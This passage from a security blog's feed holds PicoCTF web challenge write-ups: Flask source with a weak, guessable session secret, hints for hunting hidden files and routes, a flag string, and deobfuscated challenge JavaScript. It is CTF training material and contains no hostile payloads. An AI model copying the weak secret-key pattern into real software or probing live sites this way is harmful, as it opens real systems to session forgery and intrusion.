 tags: &lt;code>PicoCTF&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-picoctf-ctf-web">#&lt;/a>
&lt;/h6>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://vocus.cc/article/634c1c7efd89780001237de9">Python Flask session 學習心得&lt;/a>&lt;/p>
&lt;blockquote>
&lt;p>在Flask將資料儲存在session這個object裡面時，可看成是儲存在client端，因為資料其實是存在web server，每次新增內容到session就會新增一個新的cookie(cryptographically-signed cookies)，並透過secret_key做簽章。需注意的是這所謂的「secret_key」並不是用於加密(切勿儲存機密資料)，而是用來做數位簽章確認資料的完整性，簡單說是每個人都可以知道cookie裡面的資料，但只有server知道cookie是否被串改，如果被串改就無法登入該帳戶。&lt;/p>&lt;/blockquote>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler Source Code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-python=" data-lang="python=">from flask import Flask, render_template, request, url_for, redirect, make_response, flash, session
import random
app = Flask(__name__)
flag_value = open(&amp;#34;./flag&amp;#34;).read().rstrip()
title = &amp;#34;Most Cookies&amp;#34;
cookie_names = [&amp;#34;snickerdoodle&amp;#34;, &amp;#34;chocolate chip&amp;#34;, &amp;#34;oatmeal raisin&amp;#34;, &amp;#34;gingersnap&amp;#34;, &amp;#34;shortbread&amp;#34;, &amp;#34;peanut butter&amp;#34;, &amp;#34;whoopie pie&amp;#34;, &amp;#34;sugar&amp;#34;, &amp;#34;molasses&amp;#34;, &amp;#34;kiss&amp;#34;, &amp;#34;biscotti&amp;#34;, &amp;#34;butter&amp;#34;, &amp;#34;spritz&amp;#34;, &amp;#34;snowball&amp;#34;, &amp;#34;drop&amp;#34;, &amp;#34;thumbprint&amp;#34;, &amp;#34;pinwheel&amp;#34;, &amp;#34;wafer&amp;#34;, &amp;#34;macaroon&amp;#34;, &amp;#34;fortune&amp;#34;, &amp;#34;crinkle&amp;#34;, &amp;#34;icebox&amp;#34;, &amp;#34;gingerbread&amp;#34;, &amp;#34;tassie&amp;#34;, &amp;#34;lebkuchen&amp;#34;, &amp;#34;macaron&amp;#34;, &amp;#34;black and white&amp;#34;, &amp;#34;white chocolate macadamia&amp;#34;]
app.secret_key = random.choice(cookie_names)

@app.route(&amp;#34;/&amp;#34;)
def main():
	if session.get(&amp;#34;very_auth&amp;#34;):
		check = session[&amp;#34;very_auth&amp;#34;]
		if check == &amp;#34;blank&amp;#34;:
			return render_template(&amp;#34;index.html&amp;#34;, title=title)
		else:
			return make_response(redirect(&amp;#34;/display&amp;#34;))
	else:
		resp = make_response(redirect(&amp;#34;/&amp;#34;))
		session[&amp;#34;very_auth&amp;#34;] = &amp;#34;blank&amp;#34;
		return resp

@app.route(&amp;#34;/search&amp;#34;, methods=[&amp;#34;GET&amp;#34;, &amp;#34;POST&amp;#34;])
def search():
	if &amp;#34;name&amp;#34; in request.form and request.form[&amp;#34;name&amp;#34;] in cookie_names:
		resp = make_response(redirect(&amp;#34;/display&amp;#34;))
		session[&amp;#34;very_auth&amp;#34;] = request.form[&amp;#34;name&amp;#34;]
		return resp
	else:
		message = &amp;#34;That doesn&amp;#39;t appear to be a valid cookie.&amp;#34;
		category = &amp;#34;danger&amp;#34;
		flash(message, category)
		resp = make_response(redirect(&amp;#34;/&amp;#34;))
		session[&amp;#34;very_auth&amp;#34;] = &amp;#34;blank&amp;#34;
		return resp

@app.route(&amp;#34;/reset&amp;#34;)
def reset():
	resp = make_response(redirect(&amp;#34;/&amp;#34;))
	session.pop(&amp;#34;very_auth&amp;#34;, None)
	return resp

@app.route(&amp;#34;/display&amp;#34;, methods=[&amp;#34;GET&amp;#34;])
def flag():
	if session.get(&amp;#34;very_auth&amp;#34;):
		check = session[&amp;#34;very_auth&amp;#34;]
		if check == &amp;#34;admin&amp;#34;:
			resp = make_response(render_template(&amp;#34;flag.html&amp;#34;, value=flag_value, title=title))
			return resp
		flash(&amp;#34;That is a cookie! Not very special though...&amp;#34;, &amp;#34;success&amp;#34;)
		return render_template(&amp;#34;not-flag.html&amp;#34;, title=title, cookie_name=session[&amp;#34;very_auth&amp;#34;])
	else:
		resp = make_response(redirect(&amp;#34;/&amp;#34;))
		session[&amp;#34;very_auth&amp;#34;] = &amp;#34;blank&amp;#34;
		return resp

if __name__ == &amp;#34;__main__&amp;#34;:
	app.run()
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>PicoCTF - notepad</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---notepad/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---notepad/</guid><description>&lt;h1 id="picoctf---notepad">
 PicoCTF - notepad
 &lt;a class="anchor" href="#picoctf---notepad">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://hackmd.io/@shaoeChen/BkApyHhgf?type=view">Flask實作_基礎_03_簡述url_for與route&lt;/a>
&lt;a href="https://tedboy.github.io/flask/generated/werkzeug.url_fix.html">werkzeug.url_fix&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;h2 id="exploit">
 Exploit
 &lt;a class="anchor" href="#exploit">#&lt;/a>
&lt;/h2>
&lt;h2 id="reference">
 Reference
 &lt;a class="anchor" href="#reference">#&lt;/a>
&lt;/h2></description></item><item><title>PicoCTF - Scavenger Hunt</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---scavenger-hunt/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---scavenger-hunt/</guid><description>&lt;h1 id="picoctf---scavenger-hunt">
 PicoCTF - Scavenger Hunt
 &lt;a class="anchor" href="#picoctf---scavenger-hunt">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-picoctf-ctf-web">
 tags: &lt;code>PicoCTF&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-picoctf-ctf-web">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="http://mercury.picoctf.net:55079/">Scavenger Hunt&lt;/a>&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://icodding.blogspot.com/2015/10/htaccess.html">.htaccess 使用技巧彙整&lt;/a>&lt;/p>
&lt;blockquote>
&lt;p>.htaccess文件(或者」分佈式配置文件」）提供了針對目錄改變配置的方法， 即，在一個特定的文件目錄中放置一個包含一個或多個指令的文件， 以作用於此目錄及其所有子目錄。作為用戶，所能使用的命令受到限制。管理員可以通過Apache的AllowOverride指令來設置。
概述來說，htaccess文件是Apache伺服器中的一個配置文件，它負責相關目錄下的網頁配置。通過htaccess文件，可以幫我們實現：網頁301重定向、自定義404錯誤頁面、改變文件擴展名、允許/阻止特定的用戶或者目錄的訪問、禁止目錄列表、配置預設文件等功能。
.htaccess 詳解&lt;/p>&lt;/blockquote>
&lt;h2 id="exploit---insp3ct0r--htaccess--ds_store">
 Exploit - &lt;a href="https://bernie6401.github.io/gYsHjI-rSD6Lce-7eF6DyA">Insp3ct0r&lt;/a> + &lt;code>htaccess&lt;/code> + &lt;code>DS_Store&lt;/code>
 &lt;a class="anchor" href="#exploit---insp3ct0r--htaccess--ds_store">#&lt;/a>
&lt;/h2>
&lt;ol>
&lt;li>
&lt;p>HTML + CSS +JS
These files keeps one fragment flag each. Especially &lt;code>js&lt;/code> file&amp;rsquo;s hint: &lt;code>/* How can I keep Google from indexing my website? */&lt;/code>
&lt;img src="https://i.imgur.com/wuX9KLT.png" alt="" />&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Apache server $\to$ &lt;code>.htaccess&lt;/code> file
&lt;img src="https://i.imgur.com/li2z8l4.png" alt="" />&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Mac computer $\to$ &lt;code>.DS_Store&lt;/code> file
&lt;img src="https://i.imgur.com/iZfLWZ3.png" alt="" />&lt;/p></description></item><item><title>PicoCTF - Secrets</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---secrets/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---secrets/</guid><description>&lt;h1 id="picoctf---secrets">
 PicoCTF - Secrets
 &lt;a class="anchor" href="#picoctf---secrets">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-picoctf-ctf-web">
 tags: &lt;code>PicoCTF&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-picoctf-ctf-web">#&lt;/a>
&lt;/h6>
&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>Description: We have several pages hidden. Can you find the one with the flag?&lt;/li>
&lt;li>Hint: folders folders folders&lt;/li>
&lt;/ul>
&lt;p>這一題也是蠻有趣的&lt;/p>
&lt;h2 id="exploit---通靈">
 Exploit - &lt;font color="FF0000">通靈&lt;/font>
 &lt;a class="anchor" href="#exploit---%e9%80%9a%e9%9d%88">#&lt;/a>
&lt;/h2>
&lt;ol>
&lt;li>
&lt;p>首先看一下網頁的source code，沒什麼特別的地方，但有看到&lt;code>secret/assets/index.css&lt;/code>，所以有一個route是secrets，試看看有甚麼東西
&lt;img src="https://hackmd.io/_uploads/HywRa08_n.png" alt="" />&lt;/p>
&lt;/li>
&lt;li>
&lt;p>發現這樣的想法是對的，陸續看一下source code有甚麼其他route，就繼續加在URL就對了
&lt;img src="https://hackmd.io/_uploads/HyumC0U_2.png" alt="" />&lt;/p>
&lt;/li>
&lt;/ol>
&lt;p>Payload: &lt;code>view-source:http://saturn.picoctf.net:65352/secret/hidden/superhidden/&lt;/code>
Flag: &lt;code>picoCTF{succ3ss_@h3n1c@10n_790d2615}&lt;/code>&lt;/p>
&lt;h2 id="reference">
 Reference
 &lt;a class="anchor" href="#reference">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://youtu.be/40DYCMInk5E"> secrets | picoCTF 2022 &lt;/a>&lt;/p></description></item><item><title>PicoCTF - Some Assembly Required 1</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---some-assembly-required-1/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---some-assembly-required-1/</guid><description>&lt;h1 id="picoctf---some-assembly-required-1">
 PicoCTF - Some Assembly Required 1
 &lt;a class="anchor" href="#picoctf---some-assembly-required-1">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-picoctf-ctf-web">
 tags: &lt;code>PicoCTF&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-picoctf-ctf-web">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="https://play.picoctf.org/practice/challenge/152?category=1&amp;amp;page=1">Some Assembly Required 1&lt;/a>&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://blog.techbridge.cc/2017/06/17/webassembly-js-future/">了解 WebAssembly 的基礎使用方法&lt;/a>&lt;/p>
&lt;h2 id="source-code---after-beautify">
 Source code - After &lt;a href="https://beautifier.io/">Beautify&lt;/a>
 &lt;a class="anchor" href="#source-code---after-beautify">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler source code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-javascript=" data-lang="javascript=">const strings = [&amp;#39;value&amp;#39;, &amp;#39;2wfTpTR&amp;#39;, &amp;#39;instantiate&amp;#39;, &amp;#39;275341bEPcme&amp;#39;, &amp;#39;innerHTML&amp;#39;, &amp;#39;1195047NznhZg&amp;#39;, &amp;#39;1qfevql&amp;#39;, &amp;#39;input&amp;#39;, &amp;#39;1699808QuoWhA&amp;#39;, &amp;#39;Correct!&amp;#39;, &amp;#39;check_flag&amp;#39;, &amp;#39;Incorrect!&amp;#39;, &amp;#39;./JIFxzHyW8W&amp;#39;, &amp;#39;23SMpAuA&amp;#39;, &amp;#39;802698XOMSrr&amp;#39;, &amp;#39;charCodeAt&amp;#39;, &amp;#39;474547vVoGDO&amp;#39;, &amp;#39;getElementById&amp;#39;, &amp;#39;instance&amp;#39;, &amp;#39;copy_char&amp;#39;, &amp;#39;43591XxcWUl&amp;#39;, &amp;#39;504454llVtzW&amp;#39;, &amp;#39;arrayBuffer&amp;#39;, &amp;#39;2NIQmVj&amp;#39;, &amp;#39;result&amp;#39;];

const search_string1 = function(id1, _0x53c021) {
 id1 = id1 - 470;
 let strings6f = strings[id1];
 return strings6f;
};

(function(id1, id2) {
 const search_string = search_string1;
 while (!![]) {
 try {
 const secret_key = -parseInt(search_string(0x1eb)) + parseInt(search_string(0x1ed)) + -parseInt(search_string(0x1db)) * -parseInt(search_string(0x1d9)) + -parseInt(search_string(0x1e2)) * -parseInt(search_string(0x1e3)) + -parseInt(search_string(0x1de)) * parseInt(search_string(0x1e0)) + parseInt(search_string(0x1d8)) * parseInt(search_string(0x1ea)) + -parseInt(search_string(0x1e5));
 if (secret_key === id2) break;
 else id1[&amp;#39;push&amp;#39;](id1[&amp;#39;shift&amp;#39;]());
 } catch (_0x41d31a) {
 id1[&amp;#39;push&amp;#39;](id1[&amp;#39;shift&amp;#39;]());
 }
 }
}(strings, 627907));
let exports;
(async () =&amp;gt; {
 const search_string = search_string1;
 let _0x5f0229 = await fetch(search_string(489)),
 _0x1d99e9 = await WebAssembly[search_string(479)](await _0x5f0229[search_string(474)]()),
 _0x1f8628 = _0x1d99e9[search_string(470)];
 exports = _0x1f8628[&amp;#39;exports&amp;#39;];
})();

function onButtonPress() {
 const search_string = search_string1;
 let input_value = document[&amp;#39;getElementById&amp;#39;](search_string(484))[search_string(477)]; // document[&amp;#39;getElementById&amp;#39;](input)[value]
 for (let i = 0; i &amp;lt; input_value[&amp;#39;length&amp;#39;]; i++) {
 exports[search_string(471)](input_value[search_string(492)](i), i);
 }
 exports[&amp;#39;copy_char&amp;#39;](0, input_value[&amp;#39;length&amp;#39;]), exports[search_string(487)]() == 1 ? document[search_string(494)](search_string(0x1dc))[search_string(0x1e1)] = search_string(0x1e6) : document[search_string(0x1ee)](search_string(0x1dc))[search_string(0x1e1)] = search_string(0x1e8);
}
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>PicoCTF - Some Assembly Required 2</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---some-assembly-required-2/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---some-assembly-required-2/</guid><description>&lt;h1 id="picoctf---some-assembly-required-2">
 PicoCTF - Some Assembly Required 2
 &lt;a class="anchor" href="#picoctf---some-assembly-required-2">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-picoctf-ctf-web">
 tags: &lt;code>PicoCTF&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-picoctf-ctf-web">#&lt;/a>
&lt;/h6>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler source&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-javascript" data-lang="javascript">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#a6e22e">list_str&lt;/span> &lt;span style="color:#f92672">=&lt;/span> [&lt;span style="color:#e6db74">&amp;#39;copy_char&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;value&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;207aLjBod&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;1301420SaUSqf&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;233ZRpipt&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;2224QffgXU&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;check_flag&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;408533hsoVYx&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;instance&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;278338GVFUrH&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;Correct!&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;549933ZVjkwI&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;innerHTML&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;charCodeAt&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;./aD8SvhyVkb&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;result&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;977AzKzwq&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;Incorrect!&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;exports&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;length&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;getElementById&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;1jIrMBu&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;input&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;615361geljRK&amp;#39;&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#a6e22e">func1_cal&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">function&lt;/span>(&lt;span style="color:#a6e22e">var_a&lt;/span>, &lt;span style="color:#a6e22e">var_b&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">var_a&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">var_a&lt;/span> &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">195&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">let&lt;/span> &lt;span style="color:#a6e22e">list_strc4&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">list_str&lt;/span>[&lt;span style="color:#a6e22e">var_a&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#a6e22e">list_strc4&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>};
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>(&lt;span style="color:#66d9ef">function&lt;/span>(&lt;span style="color:#a6e22e">var_a&lt;/span>, &lt;span style="color:#a6e22e">var_b&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#a6e22e">func1_cal&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">func1_cal&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">while&lt;/span> (&lt;span style="color:#f92672">!!&lt;/span>[]) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">try&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#a6e22e">var_c&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">-&lt;/span>parseInt(&lt;span style="color:#a6e22e">func1_cal&lt;/span>(&lt;span style="color:#ae81ff">200&lt;/span>)) &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#f92672">-&lt;/span>parseInt(&lt;span style="color:#a6e22e">func1_cal&lt;/span>(&lt;span style="color:#ae81ff">201&lt;/span>)) &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#f92672">-&lt;/span>parseInt(&lt;span style="color:#a6e22e">func1_cal&lt;/span>(&lt;span style="color:#ae81ff">205&lt;/span>)) &lt;span style="color:#f92672">+&lt;/span> parseInt(&lt;span style="color:#a6e22e">func1_cal&lt;/span>(&lt;span style="color:#ae81ff">207&lt;/span>)) &lt;span style="color:#f92672">+&lt;/span> parseInt(&lt;span style="color:#a6e22e">func1_cal&lt;/span>(&lt;span style="color:#ae81ff">195&lt;/span>)) &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#f92672">-&lt;/span>parseInt(&lt;span style="color:#a6e22e">func1_cal&lt;/span>(&lt;span style="color:#ae81ff">198&lt;/span>)) &lt;span style="color:#f92672">*&lt;/span> parseInt(&lt;span style="color:#a6e22e">func1_cal&lt;/span>(&lt;span style="color:#ae81ff">212&lt;/span>)) &lt;span style="color:#f92672">+&lt;/span> parseInt(&lt;span style="color:#a6e22e">func1_cal&lt;/span>(&lt;span style="color:#ae81ff">203&lt;/span>)) &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#f92672">-&lt;/span>parseInt(&lt;span style="color:#a6e22e">func1_cal&lt;/span>(&lt;span style="color:#ae81ff">217&lt;/span>)) &lt;span style="color:#f92672">*&lt;/span> parseInt(&lt;span style="color:#a6e22e">func1_cal&lt;/span>(&lt;span style="color:#ae81ff">199&lt;/span>));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#a6e22e">var_c&lt;/span> &lt;span style="color:#f92672">===&lt;/span> &lt;span style="color:#a6e22e">var_b&lt;/span>) &lt;span style="color:#66d9ef">break&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span> &lt;span style="color:#a6e22e">var_a&lt;/span>[&lt;span style="color:#e6db74">&amp;#39;push&amp;#39;&lt;/span>](&lt;span style="color:#a6e22e">var_a&lt;/span>[&lt;span style="color:#e6db74">&amp;#39;shift&amp;#39;&lt;/span>]());
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#66d9ef">catch&lt;/span> (&lt;span style="color:#a6e22e">_0x4f8a&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">var_a&lt;/span>[&lt;span style="color:#e6db74">&amp;#39;push&amp;#39;&lt;/span>](&lt;span style="color:#a6e22e">var_a&lt;/span>[&lt;span style="color:#e6db74">&amp;#39;shift&amp;#39;&lt;/span>]());
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}(&lt;span style="color:#a6e22e">list_str&lt;/span>, &lt;span style="color:#ae81ff">310022&lt;/span>));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">let&lt;/span> &lt;span style="color:#a6e22e">exports&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>(&lt;span style="color:#66d9ef">async&lt;/span> () =&amp;gt; {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#a6e22e">func1_cal&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">func1_cal&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">let&lt;/span> &lt;span style="color:#a6e22e">res_1&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">await&lt;/span> &lt;span style="color:#a6e22e">fetch&lt;/span>(&lt;span style="color:#a6e22e">func1_cal&lt;/span>(&lt;span style="color:#ae81ff">210&lt;/span>)),
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">res_2&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">await&lt;/span> &lt;span style="color:#a6e22e">WebAssembly&lt;/span>[&lt;span style="color:#e6db74">&amp;#39;instantiate&amp;#39;&lt;/span>](&lt;span style="color:#66d9ef">await&lt;/span> &lt;span style="color:#a6e22e">res_1&lt;/span>[&lt;span style="color:#e6db74">&amp;#39;arrayBuffer&amp;#39;&lt;/span>]()),
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">res_3&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">res_2&lt;/span>[&lt;span style="color:#a6e22e">func1_cal&lt;/span>(&lt;span style="color:#ae81ff">204&lt;/span>)];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">exports&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">res_3&lt;/span>[&lt;span style="color:#a6e22e">func1_cal&lt;/span>(&lt;span style="color:#ae81ff">214&lt;/span>)];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>})();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">function&lt;/span> &lt;span style="color:#a6e22e">onButtonPress&lt;/span>() {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#a6e22e">func1_cal&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">func1_cal&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">let&lt;/span> &lt;span style="color:#a6e22e">res_1&lt;/span> &lt;span style="color:#f92672">=&lt;/span> document[&lt;span style="color:#a6e22e">func1_cal&lt;/span>(&lt;span style="color:#ae81ff">216&lt;/span>)](&lt;span style="color:#a6e22e">func1_cal&lt;/span>(&lt;span style="color:#ae81ff">218&lt;/span>))[&lt;span style="color:#a6e22e">func1_cal&lt;/span>(&lt;span style="color:#ae81ff">197&lt;/span>)];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> (&lt;span style="color:#66d9ef">let&lt;/span> &lt;span style="color:#a6e22e">idx&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>; &lt;span style="color:#a6e22e">idx&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#a6e22e">res_1&lt;/span>[&lt;span style="color:#e6db74">&amp;#39;length&amp;#39;&lt;/span>]; &lt;span style="color:#a6e22e">idx&lt;/span>&lt;span style="color:#f92672">++&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">exports&lt;/span>[&lt;span style="color:#a6e22e">func1_cal&lt;/span>(&lt;span style="color:#ae81ff">196&lt;/span>)](&lt;span style="color:#a6e22e">res_1&lt;/span>[&lt;span style="color:#a6e22e">func1_cal&lt;/span>(&lt;span style="color:#ae81ff">209&lt;/span>)](&lt;span style="color:#a6e22e">idx&lt;/span>), &lt;span style="color:#a6e22e">idx&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">exports&lt;/span>[&lt;span style="color:#e6db74">&amp;#39;copy_char&amp;#39;&lt;/span>](&lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#a6e22e">res_1&lt;/span>[&lt;span style="color:#a6e22e">func1_cal&lt;/span>(&lt;span style="color:#ae81ff">215&lt;/span>)]), &lt;span style="color:#a6e22e">exports&lt;/span>[&lt;span style="color:#a6e22e">func1_cal&lt;/span>(&lt;span style="color:#ae81ff">202&lt;/span>)]() &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#f92672">?&lt;/span> document[&lt;span style="color:#e6db74">&amp;#39;getElementById&amp;#39;&lt;/span>](&lt;span style="color:#a6e22e">func1_cal&lt;/span>(&lt;span style="color:#ae81ff">211&lt;/span>))[&lt;span style="color:#a6e22e">func1_cal&lt;/span>(&lt;span style="color:#ae81ff">208&lt;/span>)] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">func1_cal&lt;/span>(&lt;span style="color:#ae81ff">206&lt;/span>) &lt;span style="color:#f92672">:&lt;/span> document[&lt;span 